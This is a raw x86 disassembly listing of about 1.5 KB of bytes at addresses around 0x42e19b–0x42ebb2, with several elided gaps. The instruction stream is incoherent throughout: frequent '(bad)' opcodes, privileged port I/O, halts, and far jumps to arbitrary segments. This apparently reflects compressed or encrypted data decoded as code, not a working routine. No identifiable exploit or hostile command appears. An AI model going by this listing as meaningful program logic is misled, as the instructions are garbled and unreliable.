  42e19b:	outs   dx,DWORD PTR ds:[esi]
  42e19c:	jp     0x42e1c7
  42e19e:	stos   DWORD PTR es:[edi],eax
  42e19f:	(bad)
  42e1a3:	inc    esi
  42e1a4:	mov    eax,ds:0x5542c9a0
  42e1a9:	push   esp
  42e1aa:	les    ecx,FWORD PTR [ecx+0x26]
  42e1ad:	(bad)  
  42e1ae:	pop    ds
  42e1af:	ins    DWORD PTR es:[edi],dx
  42e1b0:	das    
  42e1b1:	fidivr WORD PTR [ebx-0x35]
  42e1b4:	fidiv  DWORD PTR [edx+0x75]
  42e1b7:	jo     0x42e204
  42e1b9:	xor    al,0xeb
  42e1bb:	or     ebx,eax
  42e1bd:	adc    ah,BYTE PTR [edx-0x5c]
  42e1c0:	adc    al,0x70
  42e1c2:	ret    0xd96e
  42e1c5:	xchg   ebp,eax
  42e1c6:	test   eax,0xde7b66bc
  42e1cb:	aas    
  42e1cc:	mov    esi,0x74abea07
  42e1d1:	xor    al,0x1f
  42e1d3:	shl    BYTE PTR [eax+edx*8+0x69],cl
  42e1d7:	int    0x1a
  42e1d9:	sbb    BYTE PTR [eax+eax*2+0x4d],bl
  42e1dd:	sbb    dl,BYTE PTR [eax-0x62d114a1]
  42e1e3:	out    0xe4,al
  42e1e5:	and    eax,DWORD PTR [ecx-0xf]
  42e1e8:	out    0x7e,al
  42e1ea:	nop
  42e1eb:	mov    edi,0xe337ecf5
  42e1f0:	sub    bl,BYTE PTR [edx+0x33]
  42e1f3:	ficom  WORD PTR [eax+edx*8+0x3f]
  42e1f7:	jno    0x42e17a
  42e1f9:	out    dx,eax
  42e1fa:	loopne 0x42e25d
  42e1fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e1fd:	xlat   BYTE PTR ds:[ebx]
  42e1fe:	fidiv  WORD PTR [ecx-0x36]
  42e201:	push   esp
  42e202:	fstp   DWORD PTR [edx+0x36]
  42e205:	jne    0x42e23c
  42e207:	ror    DWORD PTR [eax+edi*4-0x27],1
  42e20b:	push   ds
  42e20c:	mov    bh,0xeb
  42e20e:	sbb    BYTE PTR ds:0xda3778b5,al
  42e214:	bound  esi,QWORD PTR [edi-0x21]
  42e217:	(bad)  
  42e218:	int    0xf0
  42e21a:	fild   WORD PTR [ebp+esi*4+0x12]
  42e21e:	xchg   edx,eax
  42e21f:	fistp  WORD PTR [eax-0x51]
  42e222:	pushf  
  42e223:	mov    ecx,0x5062b4a
  42e228:	xor    eax,0xa06c2848
  42e22d:	aaa    
  42e22e:	sbb    DWORD PTR [ecx],ebx
  42e230:	fs or  eax,0x7968b1
	...
  42e296:	lods   eax,DWORD PTR ds:[esi]
  42e297:	cmp    eax,0xb79aa78a
  42e29c:	lods   eax,DWORD PTR ds:[esi]
  42e29d:	aas    
  42e29e:	mov    al,0xd4
  42e2a0:	mov    edi,0xed98bdf2
  42e2a5:	add    DWORD PTR [ebp+0x70001ee],edx
  42e2ab:	add    DWORD PTR [eax],eax
  42e2ad:	add    bl,dh
  42e2af:	(bad)  
  42e2b0:	sbb    al,BYTE PTR [esi-0x53]
  42e2b3:	push   edi
  42e2b4:	mov    dl,cl
  42e2b6:	sub    DWORD PTR [esi-0x5e],ecx
  42e2b9:	in     al,dx
  42e2ba:	adc    esi,DWORD PTR [edi+edi*2-0x5b]
  42e2be:	lock test al,0x39
  42e2c1:	or     DWORD PTR [eax+0x4f],esp
  42e2c4:	and    eax,0xb49f5b43
  42e2c9:	cmp    DWORD PTR [eax-0xa932223],edx
  42e2cf:	cld    
  42e2d0:	jnp    0x42e29a
  42e2d2:	adc    ah,BYTE PTR [edi-0x16]
  42e2d5:	int3   
  42e2d6:	je     0x42e29f
  42e2d8:	push   es
  42e2d9:	xchg   esp,eax
  42e2da:	pop    esp
  42e2db:	mov    esi,0x3bde06bd
  42e2e0:	mov    bl,0x4d
  42e2e2:	test   eax,0x7b20da95
  42e2e7:	jno    0x42e336
  42e2e9:	sbb    eax,0xbf4734df
  42e2ee:	repnz (bad) 
  42e2f1:	or     ebp,DWORD PTR [eax-0xbf08fb3]
  42e2f7:	inc    ecx
  42e2f8:	rcl    BYTE PTR [edi-0x3c7c55c0],1
  42e2fe:	in     al,dx
  42e2ff:	clc    
  42e300:	sahf   
  42e301:	shl    DWORD PTR [ecx],cl
  42e303:	sbb    DWORD PTR [esi],eax
  42e305:	xchg   edi,eax
  42e306:	rol    BYTE PTR [esi+0x7751bcfa],0x47
  42e30d:	inc    ebp
  42e30e:	dec    edi
  42e30f:	call   0x7656:0xb897b902
  42e316:	ret    
  42e317:	mov    ds:0x46735a15,al
  42e31c:	test   BYTE PTR [eax-0x60439d0b],0x51
  42e323:	call   0x1d69:0xdd0ed43a
  42e32a:	mov    ebx,0x5d8a23bc
  42e32f:	inc    ecx
  42e330:	or     DWORD PTR [edx],0x9
  42e333:	push   esi
  42e334:	push   esi
  42e335:	(bad)  
  42e336:	stos   BYTE PTR es:[edi],al
  42e337:	push   cs
  42e338:	jo     0x42e2f1
  42e33a:	pop    esi
  42e33b:	scas   al,BYTE PTR es:[edi]
  42e33c:	fbstp  TBYTE PTR [esi]
  42e33e:	cmp    esp,edx
  42e340:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e341:	mov    DWORD PTR [edi],esp
  42e343:	mov    bl,0xb5
  42e345:	fisubr DWORD PTR [edi]
  42e347:	popf   
  42e348:	arpl   bp,si
  42e34a:	in     eax,dx
  42e34b:	pop    eax
  42e34c:	mov    bl,0x27
  42e34e:	or     dl,BYTE PTR [eax-0x1da0ad0d]
  42e354:	js     0x42e399
  42e356:	pop    ebx
  42e357:	sahf   
  42e358:	shr    BYTE PTR ds:0x277d9bdd,1
  42e35e:	lahf   
  42e35f:	retf   
  42e360:	push   edx
  42e361:	loop   0x42e309
  42e363:	jo     0x42e33c
  42e365:	pusha  
  42e366:	scas   eax,DWORD PTR es:[edi]
  42e367:	in     al,0x0
  42e369:	xlat   BYTE PTR ds:[ebx]
  42e36a:	inc    ebx
  42e36b:	jmp    0x42e319
  42e36d:	lds    dx,DWORD PTR [eax-0x21]
  42e371:	inc    ebp
  42e372:	test   eax,0x1bdf6409
  42e377:	icebp  
  42e378:	cmp    esi,DWORD PTR [ebx]
  42e37a:	jns    0x42e37e
  42e37c:	sbb    BYTE PTR [edx],cl
  42e37e:	repz pushf 
  42e380:	and    DWORD PTR [edx],esi
  42e382:	out    0x7c,eax
  42e384:	mov    bl,0xfc
  42e386:	jmp    0xc38c:0xef190ef0
  42e38d:	mov    ebx,esp
  42e38f:	loopne 0x42e3e6
  42e391:	pop    edx
  42e392:	mov    ch,0x52
  42e394:	add    edx,esi
  42e396:	adc    al,0xa0
  42e398:	sbb    BYTE PTR [edx-0x4d],ah
  42e39b:	loopne 0x42e337
  42e39d:	ret    
  42e39e:	dec    esp
  42e39f:	pop    es
  42e3a0:	ss or  edx,0x67403f82
  42e3a7:	aaa    
  42e3a8:	cwde   
  42e3a9:	(bad)  
  42e3aa:	clc    
  42e3ab:	dec    eax
  42e3ac:	sbb    al,0x80
  42e3ae:	adc    dx,di
  42e3b1:	mov    ebx,cs
  42e3b3:	leave  
  42e3b4:	jno    0x42e3b6
	...
  42e416:	loop   0x42e3d5
  42e418:	fadd   st(7),st
  42e41a:	(bad)  
  42e41c:	sti    
  42e41d:	mov    ebp,0x348341d6
  42e422:	out    dx,eax
  42e423:	push   es
  42e424:	loope  0x42e405
  42e426:	pushf  
  42e427:	out    dx,eax
  42e428:	add    DWORD PTR [eax],eax
  42e42a:	pop    es
  42e42b:	add    DWORD PTR [eax],eax
  42e42d:	add    bl,al
  42e42f:	into   
  42e430:	jo     0x42e48c
  42e432:	mov    ds:0xd1cd9834,eax
  42e437:	shl    DWORD PTR [eax],1
  42e439:	lods   al,BYTE PTR ds:[esi]
  42e43a:	xor    eax,0xd0ec3b5a
  42e43f:	pop    ecx
  42e440:	dec    ebp
  42e441:	or     ah,dh
  42e443:	sbb    bh,bh
  42e445:	outs   dx,BYTE PTR ds:[esi]
  42e446:	add    DWORD PTR [ebp+0x696e1760],0x2e
  42e44d:	inc    edi
  42e44e:	fisttp WORD PTR [ecx+0x63]
  42e451:	out    0x3d,al
  42e453:	das    
  42e454:	xor    DWORD PTR [eax-0x1388b36],ebp
  42e45a:	test   DWORD PTR [esi+0x26],0x3f857517
  42e461:	add    ebp,DWORD PTR [ebx]
  42e463:	inc    esp
  42e464:	push   ds
  42e465:	cmc    
  42e466:	push   eax
  42e467:	or     BYTE PTR [edx],0xd5
  42e46a:	mov    ds:0xe033dc42,eax
  42e46f:	test   BYTE PTR ds:0xf0544181,ah
  42e475:	imul   edi,DWORD PTR [esi-0x1c],0x7d
  42e479:	idiv   BYTE PTR [edx+0xd]
  42e47c:	dec    esi
  42e47d:	mov    bh,0x45
  42e47f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e480:	(bad)  
  42e481:	call   0x46bf3fa
  42e486:	or     edx,esi
  42e488:	ds inc eax
  42e48a:	mov    edx,0x701f0430
  42e48f:	hlt    
  42e490:	les    edi,FWORD PTR [ebp+0x7e860685]
  42e496:	jnp    0x42e4d0
  42e498:	mov    DWORD PTR [ecx],eax
  42e49a:	pop    ebx
  42e49b:	js     0x42e492
  42e49d:	xchg   edx,eax
  42e49e:	stos   BYTE PTR es:[edi],al
  42e49f:	xor    bl,0x6a
  42e4a2:	retf   
  42e4a3:	and    DWORD PTR [esi-0x6cbc4e79],0x1bb4faab
  42e4ad:	push   0x99799140
  42e4b2:	imul   ecx,edx,0x12
  42e4b5:	inc    esi
  42e4b6:	lods   al,BYTE PTR ds:[esi]
  42e4b7:	call   0xa11f2a02
  42e4bc:	icebp  
  42e4bd:	lods   al,BYTE PTR ds:[esi]
  42e4be:	das    
  42e4bf:	dec    edx
  42e4c0:	jae    0x42e49b
  42e4c2:	push   ecx
  42e4c3:	rcl    DWORD PTR [edi],1
  42e4c5:	or     eax,0x32101041
  42e4ca:	push   es
  42e4cb:	xor    DWORD PTR [ebx],eax
  42e4cd:	pop    edi
  42e4ce:	fistp  QWORD PTR [ecx]
  42e4d0:	xchg   ebx,eax
  42e4d1:	add    DWORD PTR [ebp-0x7f46496d],eax
  42e4d7:	mov    al,ds:0x815ced6b
  42e4dc:	push   ebp
  42e4dd:	sub    BYTE PTR [edi-0x6f],bh
  42e4e0:	sbb    BYTE PTR [ebx-0x3a14fd0],ch
  42e4e6:	repz dec ecx
  42e4e8:	sub    ebp,0xf099f300
  42e4ee:	xchg   ecx,eax
  42e4ef:	jo     0x42e499
  42e4f1:	adc    BYTE PTR [ebx-0x6],0x18
  42e4f5:	mov    ch,0x2
  42e4f7:	sbb    BYTE PTR [edi-0x32],dh
  42e4fa:	aas    
  42e4fb:	bnd jp 0x42e4de
  42e4fe:	in     eax,dx
  42e4ff:	(bad)  
  42e500:	fwait
  42e501:	fwait
  42e502:	rcr    BYTE PTR [edx],0xc7
  42e505:	jle    0x42e56a
  42e507:	inc    ebp
  42e508:	mov    BYTE PTR [ebp-0x2c6f2d32],dh
  42e50e:	daa    
  42e50f:	pop    ebx
  42e510:	hlt    
  42e511:	shr    DWORD PTR [esi-0x3],1
  42e514:	repz pop eax
  42e516:	pop    ebp
  42e517:	and    al,0xf1
  42e519:	lds    edi,FWORD PTR [edi-0x29054822]
  42e51f:	(bad)  [esi+0x23c2cc2]
  42e525:	mov    dh,0xf0
  42e527:	fadd   st(0),st
  42e529:	loope  0x42e549
  42e52b:	into   
  42e52c:	cli    
  42e52d:	jl     0x42e516
  42e52f:	adc    dl,ah
  42e531:	ds xchg ebp,eax
  42e533:	sti    
  42e534:	cli    
	...
  42e595:	add    BYTE PTR [ebp+0x38],dl
  42e598:	into   
  42e599:	adc    bh,ch
  42e59b:	neg    bh
  42e59d:	jge    0x42e5e9
  42e59f:	mov    DWORD PTR [ebx],ecx
  42e5a1:	stc    
  42e5a2:	push   esi
  42e5a3:	push   esp
  42e5a4:	loope  0x42e576
  42e5a6:	mov    ds:0x70001f0,eax
  42e5ab:	add    DWORD PTR [eax],eax
  42e5ad:	add    bl,al
  42e5af:	dec    esi
  42e5b0:	test   al,0xa7
  42e5b2:	call   0x22e2979e
  42e5b7:	push   cs
  42e5b8:	aam    0x71
  42e5ba:	push   esi
  42e5bb:	shr    DWORD PTR [ebx+esi*8+0x31],0x43
  42e5c0:	push   0x60d2351e
  42e5c5:	in     al,0x19
  42e5c7:	repz and eax,0x5a7ee746
  42e5cd:	daa    
  42e5ce:	jge    0x42e5ee
  42e5d0:	popa   
  42e5d1:	in     al,dx
  42e5d2:	dec    edi
  42e5d3:	imul   ebp,DWORD PTR [ecx+ecx*2+0x1a6116a5],0x1
  42e5db:	adc    BYTE PTR ds:0xfd88cd5d,al
  42e5e1:	mov    ch,al
  42e5e3:	cmp    eax,0x6baff147
  42e5e9:	ret    0x16e5
  42e5ec:	xchg   edi,eax
  42e5ed:	mov    esi,0x11f17fe0
  42e5f2:	nop
  42e5f3:	sub    edi,DWORD PTR [esi-0x67767336]
  42e5f9:	fadd   st(3),st
  42e5fb:	js     0x42e5b2
  42e5fd:	xchg   esp,eax
  42e5fe:	pop    eax
  42e5ff:	lds    esi,FWORD PTR [ebx+0x7e]
  42e602:	cmp    eax,0x19bc322d
  42e607:	pop    edi
  42e608:	(bad)  
  42e609:	sbb    BYTE PTR [edx+esi*8-0x57fcd054],dh
  42e610:	fcmovnb st,st(0)
  42e612:	sub    DWORD PTR [ebx+ebp*4+0x3a0f59f1],esp
  42e619:	stos   DWORD PTR es:[edi],eax
  42e61a:	call   0xad3b6f79
  42e61f:	jmp    0x6c060ab9
  42e624:	and    dl,al
  42e626:	cmp    bh,ah
  42e628:	icebp  
  42e629:	jnp    0x42e5b2
  42e62b:	outs   dx,BYTE PTR ds:[esi]
  42e62c:	mov    ebx,0xb400c0f9
  42e631:	inc    edx
  42e632:	hlt    
  42e633:	or     eax,0xdedbeaf
  42e638:	loop   0x42e632
  42e63a:	loope  0x42e61e
  42e63c:	fnstsw WORD PTR [esi+ecx*8-0x53]
  42e640:	sub    edx,ebx
  42e642:	sar    DWORD PTR ds:0x29a8489f,cl
  42e648:	pushf  
  42e649:	dec    ecx
  42e64a:	mov    ?,WORD PTR [edi]
  42e64c:	xor    BYTE PTR [ebx+0x2d716971],bh
  42e652:	inc    ebx
  42e653:	mov    bl,0x56
  42e655:	jge    0x42e5da
  42e657:	push   ebp
  42e658:	and    edx,edi
  42e65a:	aaa    
  42e65b:	xchg   ebx,eax
  42e65c:	(bad)  
  42e65e:	loope  0x42e6c3
  42e660:	pop    ebp
  42e661:	mov    ds:0xa78a9a2,eax
  42e666:	push   ebx
  42e667:	jae    0x42e68a
  42e669:	ror    BYTE PTR [eax-0x208a48df],cl
  42e66f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e670:	test   DWORD PTR [ecx],eax
  42e672:	int3   
  42e673:	xchg   ecx,eax
  42e674:	mov    ebp,0x2ef848c2
  42e679:	inc    edx
  42e67a:	mov    eax,0x98c7f586
  42e67f:	sahf   
  42e680:	mov    cl,0x4c
  42e682:	cmp    ah,BYTE PTR [ecx-0x5f]
  42e685:	mov    edx,0xb90d0a18
  42e68a:	addr16 jbe 0x42e648
  42e68d:	push   ds
  42e68e:	mov    ecx,0x9739e8db
  42e693:	std    
  42e694:	cmp    BYTE PTR [ebp+0x753c775b],0xe5
  42e69b:	addr16 inc ecx
  42e69d:	jmp    0x85b6:0x958ec33c
  42e6a4:	(bad)  
  42e6a5:	aad    0x7
  42e6a7:	clc    
  42e6a8:	cmp    BYTE PTR [eax+0x4c46a68d],ah
  42e6ae:	into   
  42e6af:	jg     0x42e6a3
  42e6b1:	(bad)  
  42e6b2:	xchg   ecx,eax
  42e6b3:	push   0xf6
	...
  42e714:	add    BYTE PTR [eax],al
  42e716:	pop    edx
  42e717:	cmp    DWORD PTR [esi+0x2d],ecx
  42e71a:	outs   dx,DWORD PTR ds:[esi]
  42e71b:	jg     0x42e798
  42e71d:	jg     0x42e6cd
  42e71f:	xor    BYTE PTR [edx+0x4c],bl
  42e722:	mov    BYTE PTR [edi-0xe557e13],bh
  42e728:	add    DWORD PTR [eax],eax
  42e72a:	pop    es
  42e72b:	add    DWORD PTR [eax],eax
  42e72d:	add    BYTE PTR [esi-0x24484b84],bh
  42e733:	cli    
  42e734:	inc    esi
  42e735:	ret    
  42e736:	pop    ss
  42e737:	or     cl,BYTE PTR [edi]
  42e739:	ficomp DWORD PTR [eax-0x3b2d52bf]
  42e73f:	lods   al,BYTE PTR ds:[esi]
  42e740:	ss inc ecx
  42e742:	aaa    
  42e743:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e744:	test   DWORD PTR [esi+ecx*1-0x41f9b638],esi
  42e74b:	xchg   ebp,eax
  42e74c:	adc    ah,BYTE PTR [ebx]
  42e74e:	cmp    BYTE PTR [eax-0x4c],dl
  42e751:	ins    BYTE PTR es:[edi],dx
  42e752:	inc    esi
  42e753:	pop    ds
  42e754:	add    al,bh
  42e756:	pop    ecx
  42e757:	inc    ebx
  42e758:	lds    eax,FWORD PTR [ecx+eiz*4-0x1c52069c]
  42e75f:	je     0x42e798
  42e761:	cmp    al,0x6f
  42e763:	ins    DWORD PTR es:[edi],dx
  42e764:	pop    ebx
  42e765:	jge    0x42e790
  42e767:	rcr    cl,cl
  42e769:	pusha  
  42e76a:	mov    edi,0x5daed4b0
  42e76f:	sbb    esi,DWORD PTR [edx+0x12c4db2b]
  42e775:	pop    ds
  42e776:	push   edx
  42e777:	mov    esp,DWORD PTR [ebx+0x4d]
  42e77a:	stc    
  42e77b:	jb     0x42e7b5
  42e77d:	gs jl  0x42e78d
  42e780:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e781:	sbb    BYTE PTR [edi+0x13],al
  42e784:	sbb    al,0xed
  42e786:	or     al,0x31
  42e788:	jg     0x42e750
  42e78a:	add    DWORD PTR [ebx+0x3dfe7879],esp
  42e790:	mov    esi,0xb6454894
  42e795:	cmp    bh,BYTE PTR [edx]
  42e797:	es (bad) 
  42e799:	and    ecx,DWORD PTR [edi-0x76]
  42e79c:	test   edi,ebx
  42e79e:	xor    al,0x60
  42e7a0:	or     BYTE PTR [ebx-0x62],bl
  42e7a3:	mov    esp,0xa542a7d0
  42e7a8:	add    eax,0xa7a177c2
  42e7ad:	and    eax,0x1154ac0a
  42e7b2:	stos   BYTE PTR es:[edi],al
  42e7b3:	pop    ds
  42e7b4:	arpl   WORD PTR [ebx],ax
  42e7b6:	or     al,0xc9
  42e7b8:	cwde   
  42e7b9:	sub    esi,ebp
  42e7bb:	lods   al,BYTE PTR ds:[esi]
  42e7bc:	or     BYTE PTR [edx+0x5e],dl
  42e7bf:	jge    0x42e745
  42e7c1:	sub    bh,BYTE PTR [edx+0x30]
  42e7c4:	shl    al,cl
  42e7c6:	jo     0x42e7e7
  42e7c8:	imul   ebx,edi,0x7dc3298f
  42e7ce:	push   cs
  42e7cf:	dec    edx
  42e7d0:	fadd   DWORD PTR [esi]
  42e7d2:	xor    eax,0x9740cbb5
  42e7d7:	or     DWORD PTR [eax+0x5f],eax
  42e7da:	leave  
  42e7db:	or     DWORD PTR [ebx+0x71b23e3a],edi
  42e7e1:	inc    esi
  42e7e2:	sbb    eax,esi
  42e7e4:	sbb    eax,0x28c5970d
  42e7e9:	fcmovnbe st,st(1)
  42e7eb:	mov    al,0x2b
  42e7ed:	or     esi,DWORD PTR [ebx+ebx*8-0x763a9aa3]
  42e7f4:	jmp    0x42e782
  42e7f6:	iret   
  42e7f7:	mov    ds:0xe742ed,al
  42e7fc:	retf   0xa105
  42e7ff:	int3   
  42e800:	into   
  42e801:	cdq    
  42e802:	add    al,0x84
  42e804:	pop    ebp
  42e805:	mov    BYTE PTR [ebp+ebp*2+0x2b],dl
  42e809:	repz jle 0x42e838
  42e80c:	test   eax,0xf0f2b3cf
  42e811:	add    BYTE PTR [ebx],bl
  42e813:	imul   esp,DWORD PTR [ecx-0xd1547b9],0x870fd08
  42e81d:	push   0x3b
  42e81f:	jnp    0x42e7ac
  42e821:	(bad)  
  42e822:	pop    esi
  42e823:	imul   eax,DWORD PTR [ebx],0xc670f083
  42e829:	retf   
  42e82a:	retf   
  42e82b:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  42e82d:	xchg   esi,eax
  42e82e:	(bad)  
  42e82f:	mov    ds:0x2d70241,al
  42e834:	jbe    0x42e836
	...
  42e896:	ret    
  42e897:	ja     0x42e8f9
  42e899:	and    al,0xf4
  42e89b:	aaa    
  42e89c:	(bad)  
  42e89d:	div    DWORD PTR [ebp+0x4d6f13c3]
  42e8a3:	sbb    bl,BYTE PTR [ecx-0x3f]
  42e8a6:	mov    cl,0xf2
  42e8a8:	add    DWORD PTR [eax],eax
  42e8aa:	pop    es
  42e8ab:	add    DWORD PTR [eax],eax
  42e8ad:	add    BYTE PTR [ecx-0x5d],bh
  42e8b0:	add    ch,ch
  42e8b2:	pushf  
  42e8b3:	mov    eax,ds:0xd6170d85
  42e8b8:	jecxz  0x42e864
  42e8ba:	out    0x43,eax
  42e8bc:	and    al,BYTE PTR [esi]
  42e8be:	push   eax
  42e8bf:	jae    0x42e883
  42e8c1:	adc    BYTE PTR [bp+di-0x418a],0x21
  42e8c7:	jb     0x42e906
  42e8c9:	(bad)  
  42e8ca:	pop    ecx
  42e8cb:	sub    DWORD PTR [ebx-0xa2ef28b],esi
  42e8d1:	sub    al,0xf6
  42e8d3:	js     0x42e863
  42e8d5:	xchg   ebp,eax
  42e8d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e8d7:	data16 mov cl,0xcb
  42e8da:	pusha  
  42e8db:	mov    edi,0xf2441fea
  42e8e0:	dec    ecx
  42e8e1:	mov    esp,DWORD PTR ds:0xf5db9423
  42e8e7:	and    ebp,DWORD PTR [esi-0x4fb9fdc8]
  42e8ed:	popf   
  42e8ee:	or     al,0xc6
  42e8f0:	sbb    dl,ah
  42e8f2:	enter  0x7710,0xf0
  42e8f6:	cmp    dh,BYTE PTR [ebx-0x13]
  42e8f9:	call   0x836f:0x77616907
  42e900:	mov    esp,0xc784f67f
  42e905:	xchg   ecx,eax
  42e906:	cmp    DWORD PTR [eax-0x5a],esp
  42e909:	cld    
  42e90a:	call   0x98db:0x4ca40a09
  42e911:	pop    ebp
  42e912:	ret    0x6417
  42e915:	xchg   edx,eax
  42e916:	pshufw mm2,QWORD PTR [ebp+0x37],0xe2
  42e91b:	or     esi,eax
  42e91d:	inc    esi
  42e91e:	xor    al,0xb6
  42e920:	jge    0x42e98d
  42e922:	sbb    ebp,DWORD PTR [ebx-0x51051831]
  42e928:	arpl   WORD PTR [esi],si
  42e92a:	jecxz  0x42e8fd
  42e92c:	and    edx,DWORD PTR [ebp+0x5bf41cb5]
  42e932:	jle    0x42e92b
  42e934:	cdq    
  42e935:	pop    eax
  42e936:	sub    DWORD PTR [ecx-0x78],0x971c1578
  42e93d:	jmp    0xf97:0x2a890d7b
  42e944:	sbb    ah,BYTE PTR [edx-0x27]
  42e947:	pusha  
  42e948:	fwait
  42e949:	xor    DWORD PTR [edi],0xffffffa4
  42e94c:	ror    edx,cl
  42e94e:	xor    eax,0x70779
  42e953:	add    ecx,DWORD PTR [ebx+0x602fc672]
  42e959:	push   cs
  42e95a:	mov    eax,ds:0x7aa867dc
  42e95f:	dec    ebp
  42e960:	cmp    ah,BYTE PTR [edi]
  42e962:	xor    ebp,edx
  42e964:	adc    ecx,DWORD PTR [edi+0x756b5984]
  42e96a:	sti    
  42e96b:	adc    eax,0x8e140f4e
  42e970:	std    
  42e971:	test   eax,0xe84cf566
  42e976:	(bad)  
  42e977:	mov    dl,0xab
  42e979:	ins    DWORD PTR es:[edi],dx
  42e97a:	imul   eax,DWORD PTR [esi+eax*8],0x9ff5d2e2
  42e981:	arpl   WORD PTR [ebx+ebp*4],dx
  42e984:	ret    
  42e985:	sti    
  42e986:	int3   
  42e987:	jl     0x42e9f0
  42e989:	pop    esi
  42e98a:	(bad)  
  42e98c:	loopne 0x42e990
  42e98e:	push   ss
  42e98f:	mov    bl,0xe3
  42e991:	mov    bl,0xa0
  42e993:	stos   DWORD PTR es:[edi],eax
  42e994:	dec    ebp
  42e995:	jbe    0x42e9fe
  42e997:	pop    ds
  42e998:	mov    ds:0x31925217,al
  42e99d:	xor    eax,0xf2a63f97
  42e9a2:	push   eax
  42e9a3:	fdiv   QWORD PTR [ebp+0x76e9d9c]
  42e9a9:	or     DWORD PTR [edi],ebp
  42e9ab:	(bad)  
  42e9ac:	data16 sub BYTE PTR [esi+0x3e38dc92],ch
  42e9b3:	in     eax,0x92
	...
  42ea15:	add    ch,ah
  42ea17:	mov    edx,0xebdfe392
  42ea1c:	cmc    
  42ea1d:	mov    esi,0xe8a967c2
  42ea22:	cld    
  42ea23:	nop
  42ea24:	jne    0x42ea3c
  42ea26:	mov    eax,0x70001f3
  42ea2b:	add    DWORD PTR [eax],eax
  42ea2d:	add    cl,ah
  42ea2f:	call   0x3984872e
  42ea34:	mov    al,ds:0x215156cc
  42ea39:	pushf  
  42ea3a:	out    0x1e,eax
  42ea3c:	push   cs
  42ea3d:	jecxz  0x42e9c0
  42ea3f:	xchg   esp,eax
  42ea40:	idiv   cl
  42ea42:	mov    bh,0x17
  42ea44:	mov    bl,0x11
  42ea46:	rcl    bh,0xca
  42ea49:	push   ebp
  42ea4a:	and    BYTE PTR [edx+0x23c30270],bl
  42ea50:	test   al,0x88
  42ea52:	add    eax,0x7e867a13
  42ea57:	in     al,0x5a
  42ea59:	xchg   esp,eax
  42ea5a:	jl     0x42ea9e
  42ea5c:	add    al,0x88
  42ea5e:	aam    0x6c
  42ea60:	push   esi
  42ea61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ea62:	int3   
  42ea63:	jp     0x42eab0
  42ea65:	pop    ds
  42ea66:	test   BYTE PTR ds:0xbdb5e5b3,al
  42ea6c:	inc    esp
  42ea6d:	sub    esp,DWORD PTR [eax+ebp*1+0x5a]
  42ea71:	mov    esi,ecx
  42ea73:	jbe    0x42e9f5
  42ea75:	push   edi
  42ea76:	inc    ebx
  42ea77:	push   ebx
  42ea78:	nop
  42ea79:	jp     0x42ea9e
  42ea7b:	rcl    BYTE PTR [ebp+0x1a7993bf],1
  42ea81:	ror    BYTE PTR [ebx+0x15e3af5d],1
  42ea87:	mov    esp,0xad755409
  42ea8c:	pop    es
  42ea8d:	sbb    al,BYTE PTR [esi]
  42ea8f:	pop    edi
  42ea90:	xchg   edi,eax
  42ea91:	push   esi
  42ea92:	ror    BYTE PTR [esp+eax*4+0x409dca36],cl
  42ea99:	test   eax,0x242f3922
  42ea9e:	or     cl,cl
  42eaa0:	scas   eax,DWORD PTR es:[edi]
  42eaa1:	in     eax,dx
  42eaa2:	icebp  
  42eaa3:	sahf   
  42eaa4:	adc    al,0x80
  42eaa6:	cmp    eax,0x962e1b90
  42eaab:	jne    0xd186ce80
  42eab1:	or     BYTE PTR ds:[ebx-0x57],al
  42eab5:	dec    ebx
  42eab6:	jle    0x42eae8
  42eab8:	test   al,0xb3
  42eaba:	cmp    BYTE PTR [esi],cl
  42eabc:	mov    bh,0x9a
  42eabe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eabf:	dec    ah
  42eac1:	ret    0x1fd4
  42eac4:	inc    ebp
  42eac5:	jecxz  0x42eb11
  42eac7:	push   edi
  42eac8:	or     edi,DWORD PTR [ecx+0x1450d5c2]
  42eace:	xor    eax,0x3177b2a1
  42ead3:	aad    0x39
  42ead5:	mul    bh
  42ead7:	mov    BYTE PTR [eax],0x4e
  42eada:	scas   al,BYTE PTR es:[edi]
  42eadb:	xchg   ebx,eax
  42eadc:	mov    al,0xc8
  42eade:	sub    al,0xa
  42eae0:	inc    ebp
  42eae1:	add    ah,BYTE PTR [edx+0x41]
  42eae4:	or     eax,0x697a1576
  42eae9:	fstp   st(0)
  42eaeb:	shl    esi,cl
  42eaed:	out    0x97,al
  42eaef:	inc    ebx
  42eaf0:	mov    esp,?
  42eaf2:	(bad)  
  42eaf3:	mov    eax,0x3c58c06f
  42eaf8:	pusha  
  42eaf9:	mov    bh,0xcb
  42eafb:	jge    0x42eb75
  42eafd:	xor    ebp,ebx
  42eaff:	jno    0x42eac0
  42eb01:	lahf   
  42eb02:	out    dx,eax
  42eb03:	push   ebx
  42eb04:	out    dx,al
  42eb05:	cmp    DWORD PTR [edi-0x10],esp
  42eb08:	dec    BYTE PTR [edi]
  42eb0a:	xchg   ebx,eax
  42eb0b:	inc    ecx
  42eb0c:	cli    
  42eb0d:	push   cs
  42eb0e:	jo     0x42eb55
  42eb10:	pushaw 
  42eb12:	loopne 0x42eb48
  42eb14:	loopne 0x42eae7
  42eb16:	shl    DWORD PTR [edi-0x13],0xa5
  42eb1a:	mov    edi,0x5699c9d
  42eb1f:	cdq    
  42eb20:	pop    ecx
  42eb21:	adc    cl,BYTE PTR [edx+0x531e25b5]
  42eb27:	(bad)  
  42eb28:	nop
  42eb29:	mov    eax,0xaae5cf
  42eb2e:	mov    ds:0xc5f8353f,eax
  42eb33:	loope  0x42eb7d
	...
  42eb95:	add    BYTE PTR [esi+0x41],bh
  42eb98:	jne    0xfc41badd
  42eb9e:	add    DWORD PTR [edi-0x7c11a526],ebp
  42eba4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eba5:	call   0x107:0x1f4bf
  42ebac:	add    BYTE PTR [eax],al
  42ebae:	out    0xc7,eax
  42ebb0:	(bad)  
  42ebb1:	pop    ebp
  42ebb2:	push   es
